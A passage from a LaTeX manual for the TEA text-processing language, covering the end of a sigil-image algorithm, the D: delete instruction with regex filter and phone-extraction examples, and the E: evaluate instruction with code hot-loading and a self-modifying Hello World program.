\item{ \textbf{GIVEN DATA}\footnote{We say ``DATA" because, in the most general sense, and given we are designing an algorithm that generates an image for any supported text --- makes sense for especially TEA, since the language knows no other datatypes other than just text, but also that, in the general sense, any arbitrary data that could be expressed using a visual method such as a QRCode or other form of sigilization, and which method fundamentally has a way to do this for a pure-number, might as well be considered a basis for any general generator, since any other datatype can, in principle at least, be reduced to some pure number by some meaningful method.} in form of a pure number, $vIN$, and for which we intend to generate a unique or corresponding image in some non-trivial encoding --- the N-SIGIL encoding in our case.
}

\item{ \textbf{PREPROCESS} the input, $vIN$, so that it can be properly processed for the rest of the algorithm. Essentially, \textbf{COMPUTE} $vA$, our first parameter based off of $vIN$, the user's input, and $vN$, cardinality of the image in terms of pixels, as such:

\begin{equation}
vA = \lfloor \frac{vIN}{vN} + (vIN \mod vN) \rfloor
\end{equation}

}

\item{ Further, \textbf{ADJUST} $vA$, so that it can map to a value within the range of columns: essentially, compute some $vAA$ as such:

\begin{equation}
vAA =  \lfloor \frac{vA}{nCol} + (vA \mod nCol) \rfloor
\end{equation}

}

\item Then, given what we have, derive some other essential image generating parameters as such:

\item{\textbf{COMPUTE} $vB$ based off of $vA$ and  so that it can map to a value within the range of columns:

\begin{equation}
vB =  (vN + vA) \mod nCol
\end{equation}

}

\item{\textbf{COMPUTE} $vC$ based off of $vB$ and  so that it can map to a value within the range of columns:

\begin{equation}
vC =  |vN - vB| \mod nCol
\end{equation}

}

\item{\textbf{COMPUTE} $vD$ based off of $vC$ and  so that it can map to a value within the range of rows:

\begin{equation}
vD =  \lfloor \frac{vC*vN}{2*vROW} + \lfloor \frac{vC*vN}{2} \rfloor \rfloor \mod nRow
\end{equation}

}

\item{\textbf{COMPUTE} $vE$ based off of $vD$ and  so that it can map to a value within the range of rows:

\begin{equation}
vE =  (\lfloor \frac{|vD - \frac{vN}{2}|}{vRow} \rfloor + \lfloor |vD - \frac{vN}{2}| \rfloor) \mod vRow
\end{equation}

}


\item{\textbf{COMPUTE} $vF$ based off of $vN$ and  so that it can map to a value within the range of columns:

\begin{equation}
vF =  (\lfloor \frac{vN}{2*nCol} \rfloor + \lfloor \frac{vN}{2} \rfloor) \mod nCol
\end{equation}

}

\item { \textbf{CONSTRUCT} the \textbf{Sigil Coordinates Specification} as sequence of 12 (x,y) coordinate pairs as such, where the last/final 6 are derived from the first 6 merely by swapping the positions of the terms such as we have $(x,y) \rightarrow (y,x)$. Essentially, we shall have this specification set:

\begin{multline}
vCOORDINATES = \langle (1,vAA), (2,vB), (3,vC), (4,vD), (5,vE), (6,vF), (vAA,1), (vB,2), (vC,3),\\
 (vD,4), (vE,5), (vF,6) \rangle
\end{multline}

}

\item { \textbf{PROCESS} the \textbf{Resultant Matrix} of the $vN$ pixels, perhaps 1 row at a time, for $nRow$, and one column on each row at a time, for $nCol$, in such a way that:
\begin{itemize}
\item{ \textbf{IF} the pixel $P_{(x,y)}$ is such that $(x,y) \in vCOORDINATES$, \textbf{THEN}:
\begin{itemize}
\item \textbf{PRINT DARK BOX}: `X' 
\end{itemize}
\item{\textbf{ELSE:}
\begin{itemize}
\item \textbf{PRINT LIGHT BOX\footnote{In our original implementation of the algorithm, we merely printed ``\#" for the LIGHT/unmarked pixels, and `X' for the marked/DARK ones. However, experimentation and taste might vary, and so, sometimes one might just decide to keep the LIGHT pixels as just plain WHITE-SPACE character such as `` " in this case, so that the final image is essentially only painted in the marked regions only --- which somewhat better brings out the ``sigil" or ``qrcode" aspect we want.}}: `` " 
\end{itemize}
}
}
\end{itemize}

}
\end{enumerate}
$\qed$
\end{alg}
  
  
 
 
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: D
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{D: DELETE}
\label{CHAPD}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Delete\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Delete something from the AI
	\item Delete everything BUT something from the AI
	\item Implement Filters
	\item Reduce Strings to Specific Patterns
	\item Eliminate All White-space
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of D:}
  \label{TABTAZD}
\end{table}




\section{SEMANTICS of D:}
\label{SECSEMD}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

d: & INERT\\

\rowcolor{lightgray}\bfseries \makecell[l]{d:REGEX \\d:RX1:RX2:…:RXN} & Delete from AI all sections matching the single regular expression REGEX or any of the given regular expressions RX1, RX2,…, RXN\\
 
 d.:REGEX & \textbf{The Exceptional Delete Instruction} that deletes from AI all sections matching the single regular expression REGEX. It doesn't accept multiple parameters, and so, everything after the first ``:" is treated as part of the pattern. It is one of few TEA commands using the ``." Qualifier.\\

\rowcolor{lightgray}\bfseries d!: & Delete all white-space from the AI (same as g:)\\
 
 \makecell[l]{d!:REGEX \\d!:RX1:RX2:…:RXN}& The Inverse of d:, for which only \textbf{sections not matching} the given patterns are deleted from AI. \\
 
 
\rowcolor{lightgray}\bfseries \makecell[l]{d*:vREGEX\\d*:vRX1:vRX2:…:vRXN} & Like the d:REGEX and d:RX1:…:RXN except, referencing the patterns stored in the named vaults.\\
 
 
 \makecell[l]{d*!:vREGEX \\d*!:vRX1:vRX2:…:vRXN}& Like the d!:REGEX and d!:RX1:…:RXN except, referencing the patterns stored in the named vaults. \\
 
 \hline
\end{tabular}
\caption{The Semantics of D:}
\label{TABSEMD}
\end{table}




\section{NOTES about D:}
\label{SECNOTESD} 


So much can be accomplished in programming with TEA --- one of few programming languages that is \textbf{text-processing} oriented by design. And talking of text-processing, note that many problems can be reduced to the need to identify and eliminate from some text or sequence, elements that match a particular pattern or those that do not match one or more patterns. We shall attempt to illustrate these things using basic examples...

First, note that one can appreciate \textbf{D:} by the following illustrative examples:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances of `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA] |#(="bC CB B B")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

But 


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances of `aA']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:aA |#(="bC CB BA aB") because no pattern "aA"
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


So, realize that the difference between the last two programs, despite being subtle, does matter --- the first invoked the \textbf{delete instruction} with an argument that is a regular expression using a \textit{character class} --- \textit{[aA]} --- whereas the later version used a regular expression ``aA" that essentially gets interpreted as \textit{a followed by A}.

Whereas, if we modify the program again such as:

\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all instances NOT `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[^aA] |#(="Aa") uses negated character class
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

We get something similar to what we would have obtained in case we had used the same pattern as in the original program, but with the \textbf{D!:} instruction:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete all things NOT `a' or `A']
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d!:[aA] |#(="Aa")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


That flexibility is essential because of the way logic using regular expressions works --- there might be scenarios in which writing a pattern to match what needs to be eliminated is easier than writing one for what needs to be retained, whereas the inverse might be true in some other cases. So, creativity and experimentation shall determine which of the forms of \textbf{D:} to use for what purpose.

And then, concerning using \textbf{D:} to eliminate white space, consider the program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: delete ALL WHITE-SPACE]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d!: |#(="bCCBBAaB")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Other quirks of the delete instruction can be appreciated with the following example:



\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: more D:]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA] |#(="bC CB B B")
d:.B |#(="bC")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

This last example could also be simplified by leveraging the fact that \textbf{D:} allows us to chain the patterns too --- essentially, we can use it in the forms \textit{d:RX1:RX2:…:RXN} or \textit{d!:RX1:RX2:…:RXN} or the related vault-referencing forms such as \textit{d*:vRX1:vRX2:…:vRXN} or 
 \textit{d*!:vRX1:vRX2:…:vRXN}. Thus, the above last example can be rewritten as:
 
 
 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: D: with chained patterns]
  \begin{lstlisting}[language=TEA]
i!: {bC CB BA aB} | #(="bC CB BA aB")
d:[aA]:.B |#(="bC")
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


Finally, note that the parameterized inverse of the Delete command makes implementing powerful complex filters easier. For example, we eliminate anything in AI that isn't a punctuation mark using the following terse program\footnote{Please note that though the code listing shown seems to indicate that the program contains some extraneous symbols after the second-last `\}', and yet, the color-coding for the TEA-source-code pretty-printer being used for typesetting this book is what has limitations when dealing with complex TEA expressions. Otherwise, the program is expressed verbatim in its complete and essential form as is, and can be tried out on the \textbf{WEB TEA IDE} as part of the standard TEA program collection: \url{https://tea.nuchwezi.com}} 


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: De PUNCTURA Filter]
  \begin{lstlisting}[language=TEA]
d!:{[\\ \[\]!"#$%&'()*+,-./:;<=>?@^_`{|}~]} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

As can be seen/appreciated when considering what the TEA regular expression standard is --- refer to \textbf{\hyperref[SECREGEXP]{Chapter \ref{SECREGEXP}}} --- note that we could also write the above program in more compact form as: \texttt{d!:\textbackslash{}W} --- with the important caveat though being that, this later version also preserves new-line characters since it merely filters out all word characters.

 
\section{EXAMPLE APPLICATIONS of D:}
\label{SECEXAMPD}

  
As explained in the section highlighting the general purposes/use-cases of the \textbf{DELETE} instruction, we find that implementing filters is among its major purposes, and so, we shall use one example to help paint a picture for what one might use \textbf{D:} for in real-life.


\subsection{EXAMPLE 1: EXTRACTING WELL-FORMATTED TELEPHONE CONTACTS from TEXT}
\label{SECEXAMP1D}


The following example, is going to be tested against a sample text such as:



\begin{figure}[H]
  \centering
  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Input Text Containing Phone Contacts]
---[ TEA WEB IDE DOCS v1.1 ]---

0704464749

Welcome to the Transforming Executable Alphabet [TEA] WEB Integrated Development Environment.

EXAMPLE: https://tea.nuchwezi.com/?fc=https://example.com/mcnemesis/+1-414-123456/raw/zha.tea


17. BACK PROPAGATE: Click to copy and load the text:+256704464749 currently in TEA Output space as the new text in the TEA Input space. 

---[FURTHER DOCS | TEA RESEARCH]

In case you still wish to explore +256 414 554 685 more concerning TEA, this WEB IDE, or any other aspects of the TEA project, definitely start by visiting the TEA GitHub0705953500 Project [linked to on the MENU], or visit the TEA Research and TEA Community links as provided on the MENU.  +254-1

Phone: 0772 609649 | 101
  \end{tcbverbatim}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}
\end{figure}


The essential TEA source for a program that we might use to extract all the phone numbers in that sample text is as such:

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: PHONE CONTACT EXTRACTOR]
  \begin{lstlisting}[language=TEA]
d!:\+[1-9]\d{7,14}:\+?[0-9][-. \d]{7,28}
h!:{[^\d]} 
k:\d 
r!:[^\d]:{ } 
r!:\W+:{ }
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: PHONE CONTACT Extractor}
  \label{FIGD}
\end{figure}


And when we run that code against the specified sample text, the output we shall get is as shown hereafter...


\begin{figure}[H]
  \centering
  \begin{tcolorbox}[title=Sample EXTRACTED Output Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
0704464749 1 414 123456 256704464749 256 414 554 685 0705953500 0772 609649
  \end{tcolorbox}
  %\caption{The TEA Instruction Lexical Specification (regular language)}
  %\label{FIG1}
\end{figure}

Of course, the example program makes some assumptions about what a valid phone number might be given internationally acceptable patterns, and the variety of phone number expressions we need to deal with in the sample text provided, and so, in a more realistic scenario, it might be that instead of using multiple match-patterns, we only need 1, or that we instead need more than the two we have specified here, or that we need to constraint or extend the ones we have specified in the arguments passed to \textbf{D!:}, so that we implement an extractor that is most suitable for the problem at hand.

\vspace{1em}


Also, besides the \textbf{D!:} instruction in that example program, most of the other TEA code included is to help clean-up the extracted contacts so that we limit or eliminate anything that is not part of the contact, and also format the result with minimal white-space between either the contacts or the sub-sequences making up a particular contact.

\vspace{1em}

Finally, realize that even though the original/input text did contain several numerical sections such as strings as ``v1.1", ``101", etc. and incomplete phone numbers such as `` +254-1", and yet, thanks to the power of the \textbf{D!:} filter and how we structured our pattern-matching regular expressions, any such values in the input are not polluting our final output.



 
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
% TAZ SECTION: E
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\chapter{E: EVALUATE}
\label{CHAPE}


\begin{table}[H]
  \centering
  \LARGE
	\begin{tabular}[t]{|p{0.2\textwidth}|p{0.5\textwidth}}
 
	\textbf{NAME} & Evaluate\\
	\hline
	\textbf{Purpose} & \begin{enumerate}
	\item Process memory as though it were a TEA program
	\item A self-contained function/procedure facility for TEA programs
	\item Securely processing External/Imported TEA source-code
	\item Mechanism for Securely Executing Auto-Generated TEA Code
	\item Facility for Self-Modifying Programs
	\end{enumerate}\\
	\hline
	              
\end{tabular}
\caption{General Objectives of E:}
  \label{TABTAZE}
\end{table}




\section{SEMANTICS of E:}
\label{SECSEME}

\begin{table}[H]
\centering
\renewcommand{\arraystretch}{1.3} % Optional: increases row height
\rowcolors{1}{lightgray}{white}   % Alternating row colors
\begin{tabular}{>{\bfseries}m{0.3\linewidth} | m{0.6\linewidth}} % 2 columns, 

\rowcolor{white}
\textbf{\makecell[l]{INSTRUCTION\\ SIGNATURE}} & \textbf{INSTRUCTION FUNCTION} \\
\hline

e: & [\textit{Implicit Context Unaware Evaluation}] Process the contents of AI as an external TEA program, with its initial AI as the EMPTY STRING and set the final IO from that program as the IO for the current instruction\\

\rowcolor{lightgray}\bfseries e:STR & [\textit{Explicit Context Unaware Evaluation}] Process the contents of STR as an external TEA program, but with current AI as its initial AI and set the final IO from that program as the IO for the current instruction\\
 
 e!: & [\textit{Implicit Extended Context Aware Evaluation}] Parse the contents of AI as a TEA program, and inject the found TEA instructions in it inline into the calling main TEA program---essentially, modifies the main program by injecting new code into it, replacing the original E: instruction in the calling program with the new program instructions, then continues normal processing in the main/calling program, starting from the first instruction in the newly injected instructions if any – the EMPTY STRING becomes input to that first instruction, otherwise (in case no TEA instructions were found) continues to the next instruction in the calling, unmodified program, with the AI set to the EMPTY STRING.\\

\rowcolor{lightgray}\bfseries e!:STR & [\textit{Explicit Extended Context Aware Evaluation}] Same as E!:, but passes current AI to the first instruction in the extension/injected TEA program,  otherwise (in case no TEA instructions were found) passes it on to the next instruction in the main/calling TEA program unmodified.\\
 
 \makecell[l]{e*: \\e*!:}& INERT \\
 
 
\rowcolor{lightgray}\bfseries e*:vNAME & Same as E:STR, but processing string stored in vault named vNAME\\
 
 
e*!:vNAME & Same as E!:STR, but processing string stored in vault named vNAME\\
 
 \hline
\end{tabular}
\caption{The Semantics of E:}
\label{TABSEME}
\end{table}




\section{NOTES about E:}
\label{SECNOTESE} 


Many mature programming languages --- GPLs especially, do offer some mechanism by which code that is originally not part of the main program might not only be imported/hot loaded into the main program, but also that such imported code might be executed adjacent to/parallel the main program or inline (as part of the main program). 

\vspace{1em}

Such code might for example be functionality that was not originally designed into the main program, but which is later needed for some specific tasks to be supported --- in which case, the external program code might be thought of as a kind of \textit{plugin} or \textit{extension}\footnote{In the past for example, and before the inventor of TEA worked on the language, they had worked on another language known as \textbf{Cwa Script} that together with an embeddable/pluggable Software Operating Environment (SOE)  known as \textbf{DNAP}\cite{lutalo2020dnap}, that for either web or desktop or mobile apps [in virtually any language], would make it easy for existing software to be readily extended or evolved with new functionality originally not part of the main software in a sense similar to how an existing web-page might be extended by leveraging ``external functionality" loaded say via an I-frame.}. But also, many languages encourage or support a facility for composing a program from various, somewhat independent or semi-independent components in the form of say libraries (such as DLLs for the C/C++ language), modules and/or sub-modules (such as in Python or JavaScript), etc.  

\vspace{1em}

Typically, for compiled languages such as C or C++, such code shall also be loaded when it is in a compiled form closest to the final/target architecture and instruction set of the associated machine or technology platform, so that, one does not or can not directly take a runtime string and execute it directly as though it were new code made available to the main program. However, for especially interpreted languages such as JavaScript, Python, LISPs, Ruby, or even compiled languages such as Erlang that run on a virtual machine with ability to hotload code or perform Just-In-Time compilation of code even loaded via strings, the ability to extend the main program with functionality parsed or read directly  from runtime-strings is not only possible but it designed into the language core.

\vspace{1em}

Below, we summarize the behavior of hot-loading code across several compiled and interpreted languages so that one might come to appreciate how TEA does it:


\begin{table}[h!]
\centering
\begin{tabular}{|l|p{3.5cm}|p{3.5cm}|p{3.5cm}|}
\hline
\textbf{Language} & \textbf{Direct Evaluation (e.g., \texttt{eval})} & \textbf{Compilation Required} & \textbf{Can Modify Main Program State} \\
\hline
\multicolumn{4}{|c|}{\textbf{Compiled Languages}} \\
\hline
C & \makecell[{{p{3.5cm}}}]{No (\texttt{system()} or dynamic loading via \texttt{dlopen})} & \makecell[{{p{3.5cm}}}]{Yes (external compilation needed)} & \makecell[{{p{3.5cm}}}]{Limited (via shared libraries or function pointers)} \\
\hline
C++ & \makecell[{{p{3.5cm}}}]{No (\texttt{system()} or dynamic/shared libraries)} & \makecell[{{p{3.5cm}}}]{Yes (compile to shared object)} & \makecell[{{p{3.5cm}}}]{Limited (via dynamic linking and function pointers)} \\
\hline
Erlang & \makecell[{{p{3.5cm}}}]{Yes (\texttt{erl\_eval}, \texttt{code:load\_binary})} & \makecell[{{p{3.5cm}}}]{Optional (hot code loading supported)} & \makecell[{{p{3.5cm}}}]{Yes (can replace modules at runtime)} \\
\hline
Java & \makecell[{{p{3.5cm}}}]{No (\texttt{JavaCompiler}, \texttt{ClassLoader})} & \makecell[{{p{3.5cm}}}]{Yes (compile to bytecode)} & \makecell[{{p{3.5cm}}}]{Yes (via reflection and dynamic class loading)} \\
\hline
\multicolumn{4}{|c|}{\textbf{Interpreted Languages}} \\
\hline
Python & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{exec()})} & No & \makecell[{{p{3.5cm}}}]{Yes (can define/modify variables, functions, classes)} \\
\hline
JavaScript & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{Function()})} & No & \makecell[{{p{3.5cm}}}]{Yes (modifies global/local scope)} \\
\hline
Ruby & \makecell[{{p{3.5cm}}}]{Yes (\texttt{eval()}, \texttt{instance\_eval})} & No & \makecell[{{p{3.5cm}}}]{Yes (can alter program state and define methods)} \\

\hline
TEA & \makecell[{{p{3.5cm}}}]{Yes (\texttt{e:}, \texttt{e!:}, \texttt{e*:} or \texttt{e*!:})} & No & \makecell[{{p{3.5cm}}}]{Yes (\texttt{e!:, e!:STR, e*!:vC} can alter caller program state)} \\

\hline
\end{tabular}
\caption{Comparison of Hot-Loading Code from Strings in Compiled vs Interpreted Languages}
\label{TABCOMPLANGE}
\end{table}


And so, with that introduction out of the way, one should realize that this functionality is indeed not only a standard feature of a good programming language, but is also essential for certain kinds of especially dynamic or generic programming. 

\vspace{1em}

Below, we shall look at some basic examples of the \textbf{Evaluate} instruction in TEA, and thereafter, delve into some non-trivial examples.

\vspace{1em}

So, first, note that one could appreciate \textbf{E:} by the following illustrative examples which, for purposes of helping make comparisons of the various different ways code hot-loading can be done in TEA, all perform the same essential function --- they load the same exact program just in different contexts, and all \textbf{MUST} return the output ``AAW" when successfully run:


 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Implicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{i!:AAA|d:^A|r:$:W} | e:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}

 \begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Implicit Extended Context Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{i!:AAA|d:^A|r:$:W} | e!:
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e:"i!:AAA|d:^A|r:$:W" 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Context Unaware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e:{i!:AAA|d:^A|r:$:W} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Explicit Extended Context Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | e!:{i!:AAA|d:^A|r:$:W} 
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Context-Unaware Vault Program Evaluation]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:{i!:AAA|d:^A|r:$:W} |
 e*:vPROG  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Injection-Evaluation with In-Vault Program]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:{i!:AAA|d:^A|r:$:W} |
 e*!:vPROG  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Injection-Evaluation with In-Vault Program v2]
  \begin{lstlisting}[language=TEA]
i!:{BC CB BA AB} | v:vPROG:"i!:AAA|d:^A|r:$:W" | 
e*!:vPROG   
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


The above eight TEA programs are actually equivalent though different and all approaching the same problem in different ways --- essentially, executing external/injected TEA code from within a main/host TEA program. 

\vspace{1em}

However, to truly appreciate the power of \textbf{E:}, let us consider the following non-trivial program:


\begin{figure}[H]
 \Large
  \centering
  \begin{tcolorbox}[teaterminalstyle, title=Non-Trivial Injection and Context-Aware Evaluation]
  \begin{lstlisting}[language=TEA]
i!:ABC

l:lHEW
h:

e!:{
    v:
    v:vE:XYZ
    |v!:
    |v:vOL
    |g*:-< >-:vE:vOL
    |v:vMIX
    |l:lGEN
    |p!:5
    |x*:vMIX
    |f:[ai]:lMASK
    |l:lSALT
    |s:1_0_1
    |f:[a1]:lGEN
    }

l:lMASK
g!:**  
   \end{lstlisting}
  \end{tcolorbox}
\end{figure}


It not only demonstrates all the tricky aspects of a TEA program, however, it is a great example for how to create self-modifying TEA programs. Essentially, all the TEA code inside the \texttt{e!:\{…\}} block ends up not being processed as an external TEA program, but gets injected into the main program, and uses its AI and existing label blocks! This program will for example return a string starting with the injected sub-string ``XYZ" such as ``XYZ**5uaikq" if the injected program reached a state where the AI contains the sub-string ``ai", otherwise will return a string starting with ``A++B++C" such as ``\verb$A++B++CXYZ-< >-5hlca1_0_1x$" in case the program reached a state where the AI contains the substring ``a1". A full appreciation of how this program works is shown in a runtime DEBUG dump of this program in the official CLI TTTT tests\cite{cli_tttt}.

\vspace{1em}

Among the peculiarities of that example is that the injected/external program contains logic that not only modified the main program (such as creating new code/l-blocks with instructions such as \texttt{l:lSALT}), but also references sections of the main program otherwise not directly visible to the injected/external program (such as the \texttt{f:[ai]:lMASK} branching instruction).


\section{EXAMPLE APPLICATIONS of E:}
\label{SECEXAMPE}

  
Given that TEA's \textbf{Evaluate} instruction is ideal for creating not just dynamic programs but rather programs that can also modify themselves, we shall want to first take a moment to appreciate what in general is known\cite{copilot_assistant} about such scenarios as when one might need a self-modifying program:



\begin{table}[htbp]
\centering
\caption{Non-Trivial Scenarios for Self-Modifying Programs}
\renewcommand{\arraystretch}{1.4}
\begin{tabularx}{0.8\textwidth}{>{\raggedright\arraybackslash}p{2.5cm} >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}X >{\raggedright\arraybackslash}X}
\hline
\textbf{Case} & \textbf{Scenario} & \textbf{Why Self-Modify} & \textbf{Example} \\
\hline
Embedded Optimization & Devices with limited resources need to adapt to changing conditions. & To rewrite code for more efficient algorithms or disable unused features, saving memory and power. & A satellite reprograms its data compression logic based on signal quality. \\
\hline
Evolutionary Algorithms & Programs evolve to solve complex problems like strategy or learning. & Code mutates and recombines to simulate biological evolution for optimal solutions. & A game AI rewrites its own tactics based on win/loss feedback. \\
\hline
Security and Anti-Tampering & Software must resist reverse engineering or unauthorized changes. & Dynamic code changes obscure logic and detect tampering attempts. & A DRM system modifies its decryption routine to prevent static analysis. \\
\hline
Simulation and Testing & Platforms need to test many behavioral permutations rapidly. & Injecting logic on the fly allows fast prototyping without restarting or recompiling. & An autonomous vehicle simulator rewrites decision trees during runtime. \\
\hline
JIT Compilation & Runtime systems optimize performance-critical paths. & Frequently used code paths are rewritten for speed and efficiency. & A JavaScript engine replaces interpreted code with compiled machine code. \\
\hline
Multi-Architecture Support & Programs must run across diverse systems from a single binary. & Code rewrites itself to load appropriate modules or instructions per environment. & A bootloader modifies its startup sequence based on detected CPU architecture. \\
\hline
Meta-Learning AI & AI agents improve their own learning processes. & Agents restructure their logic based on performance feedback. & A reinforcement learning agent rewrites its reward function to improve convergence. \\
\hline
\end{tabularx}
\end{table}

That said, note that the example we are going to look at, despite not being exactly inspired by a real-life problem, does help illustrate just how useful both self-modification of a TEA program might be when two important features are combined; 

\begin{enumerate}
\item The ability to automatically generate valid TEA program code on the fly and from nothing.
\item The ability to execute a stored string as though it were a TEA program --- in this particular case, we shall only focus on the \textbf{Context Unaware} evaluation scenarios.
\end{enumerate}


\subsection{EXAMPLE 1: AUTO-GENERATION of VALID SELF-MODIFYING CODE}
\label{SECEXAMP1E}


The simplest TEA program one might write is the so-called \texttt{HELLO WORLD} program, which, as shown below, simply does one thing --- prints the message ``Hello World" and quits.


\begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=A Basic TEA Hello World Program]
  \begin{lstlisting}[language=TEA]
i!:{Hello World}
   \end{lstlisting}
  \end{tcolorbox}
  \caption{A Basic TEA Hello World Program}
  \label{EXTEAHW}
\end{figure}


One might easily test/try out such a basic program via the WEB TEA IDE by invoking the following special URL in a web browser:

\vspace{1em}

 \url{https://tea.nuchwezi.com/?c=i!:{Hello+World}&run}

\vspace{1em}
That said, assuming we wrote a special version of that Hello World Program, that not only starts out the same exact way, and which allows no other explicit input except that initial string ``Hello World", but which, after it loads it, goes ahead to [use it to] generate a random program that then gets loaded into the main/caller program, and which then is executed [as an external program] against that initial input, and so that, whatever that external program returns, is a function of both the original input and what auto-generated code we ended up with. Essentially, we would expect a random program that somewhat makes the main program behave as a dynamic self-modifying program operating on the explicit input string ``Hello World" to return... \textit{whatever}!

\vspace{1em}

Such a program could be something like this...


 \begin{figure}[H]
 \Large
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: SELF-MODIFYING HELLO WORLD]
  \begin{lstlisting}[language=TEA]
i!:{Hello World} | v:vIN

e:{
 p!:3:abcdghikmnopqrstuvxy
 s:!|s:!
 h:[a-z]
 r!::_ | d:{ _} | d:^_ | r!:_!:! | r!:_:: | r:!{2,}:!
 h!:[a-z]
 k:[a-z]
}

v:vCMD #store the program we generated

y:vIN #load original input
e*:vCMD #execute it against generated program
v:vOUT #store the output

#then present the session results..
v:I:{Input was:} | v:C:{Auto-Generated Program Was:} 
| v:O:{Output Was:} | v:S:_
g*:_:I:vIN:S:C:vCMD:S:O:vOUT
r!:_:{
}
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: A SELF-MODIFYING HELLO WORLD TEA Program}
  \label{FIGD}
\end{figure}


Upon running that code, anywhere TEA can work, we shall get results such as the following...


  %\begin{tcolorbox}[title=Sample Text Containing Phone Contacts,  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
  \begin{tcbverbatim}[title=Sample Session of Self-Modifying TEA Hello World]
Input was:
Hello World


Auto-Generated Program Was:
k: :
v: :
p!:


Output Was:
hoymadebppfznmajnwmprwra ymtlhuxwkehmcmpdqnhaos trfmgkakypbv  
  \end{tcbverbatim}
